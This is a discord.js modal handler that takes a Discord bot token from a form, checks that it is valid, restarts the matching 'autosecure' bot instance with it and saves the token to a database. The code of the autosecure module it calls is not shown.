const { EmbedBuilder } = require("discord.js");
const showbotmsg = require("../../../autosecure/utils/bot/showbotmsg");
const { queryParams } = require("../../../db/database");
const { autosecureMap } = require("../../handlers/botHandler");
const autosecure = require("../../../autosecure/autosecure");
const checkToken = require("../../../autosecure/utils/utils/checkToken");

module.exports = {
    name: "tokenmodal",
    editbot: true,
    callback: async (client, interaction) => {
     //   console.log(`Tokenmodal!`);
        
        const token = interaction.fields.getTextInputValue('token');
        if (client.isuserbot) {
            console.log(`Returning..`);
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Please use the main Autosecure bot to delete this bot!")
                        .setColor("#87CEEB")
                ],
                ephemeral: true
            });
            return;
        }

        await interaction.deferUpdate();

        const checked = await checkToken(token);
        if (!checked) {
            return interaction.followUp({
                content: `Please fill in a valid Discord Token!`,
                ephemeral: true
            });
        }

        const [userId, botnumber] = interaction.customId.split('|').slice(1);
        const key = `${userId}|${botnumber}`;
        const existing = autosecureMap.get(key);

        if (existing) {
            console.log(`Already has running one! destroying!`)
            autosecureMap.delete(key);
            existing.destroy();
        }

        const instance = await autosecure(token, userId, botnumber);
        autosecureMap.set(key, instance);

        await queryParams(
            'UPDATE autosecure SET token = ? WHERE user_id = ? AND botnumber = ?',
            [token, userId, botnumber]
        );

        const msg = await showbotmsg(interaction.user.id, botnumber, interaction.user.id, client);
        return interaction.editReply(msg);
    }
};
